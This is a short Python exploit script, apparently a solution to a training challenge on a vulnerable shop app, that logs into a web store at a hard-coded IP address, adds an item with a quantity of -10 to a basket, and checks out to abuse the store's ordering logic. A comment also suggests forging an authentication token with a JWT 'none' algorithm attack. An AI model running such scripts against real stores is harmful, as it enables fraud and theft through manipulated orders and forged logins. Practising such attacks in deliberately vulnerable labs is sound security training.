import json
import sys

import requests

# Update basket number! Find by adding anything to cart with Chrome's network tab in devtools open
basket_id = 1

s = requests.Session()

# Login with any user or forge a token with "JWT None Alg Attack.py"
r = s.post(
    'http://43.241.202.47:3003/rest/user/login',
    data=json.dumps({
        "email": 'example@example.com',
        "password": 'example',
    }),
    headers={'Content-type': 'application/json;charset=utf-8'},
)
print("Login:", r)
if r.status_code != 200:
    sys.exit()
s.headers.update({'Authorization': "Bearer " + json.loads(r.text)['authentication']['token']})

r = s.post(
    'http://43.241.202.47:3003/api/BasketItems/',
    data=json.dumps({'ProductId': 2, 'BasketId': str(basket_id), 'quantity': -10}),
    headers={'Content-type': 'application/json', },
)
print("Add to basket:", r)

r = s.post('http://43.241.202.47:3003/rest/basket/' + str(basket_id) + '/checkout')

print("Checkout basket:", r)
